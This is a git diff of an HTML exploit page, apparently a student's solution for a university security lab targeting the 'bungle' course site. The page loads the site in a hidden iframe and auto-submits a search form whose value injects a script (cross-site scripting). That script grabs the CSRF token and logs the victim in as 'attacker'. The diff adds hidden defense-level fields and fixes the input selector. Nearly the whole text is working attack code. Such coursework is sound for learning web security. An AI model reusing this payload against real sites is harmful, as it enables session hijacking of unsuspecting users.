@@ -2,6 +2,8 @@
 <html>
   <iframe name="Z" src="http://bungle-cs461.csl.illinois.edu" width="0" height="0" frameborder="0"></iframe>
   <form action="http://bungle-cs461.csl.illinois.edu/search" method="GET" target="Z">
+    <input id="csrf" name="csrfdefense" type="text" value="1" style="display: none">
+    <input id="xss" name="xssdefense" type="text" value="0" style="display: none">
     <input id="search" name="q" type="text" value="" style="display: none">
   </form>
 <script>
@@ -15,7 +17,7 @@
         $.post(`http://bungle-cs461.csl.illinois.edu/login`, {username: 'attacker', password: 'l33th4x', csrf_token: token})
     }
 
-    document.querySelector('input').value = "<script>" + inject.toString() + ';inject();' + "</script" + ">";
+    document.querySelector('#search').value = "<script>" + inject.toString() + ';inject();' + "</script" + ">";
 
     document.forms[0].submit()
 </script>
